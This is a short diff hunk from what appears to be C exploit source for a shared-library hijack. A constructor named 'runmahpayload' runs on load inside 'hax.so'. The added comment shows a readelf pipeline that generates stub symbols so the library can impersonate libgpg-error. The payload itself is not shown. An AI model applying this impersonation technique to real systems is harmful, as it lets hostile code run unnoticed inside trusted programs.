@@ -9,7 +9,7 @@
 //gcc -shared -o hax.so hax.o -ldl
 
 static void runmahpayload() __attribute__((constructor));
-
+//readelf command example: readelf -s --wide /lib/x86_64-linux-gnu/libgpg-error.so.0 | grep FUNC | grep GPG_ERROR | awk '{print "int",$8}' | sed 's/@@GPG_ERROR_1.0/;/g'
 int gpgrt_onclose;
 // [...output from readelf here...]
 int gpgrt_poll;
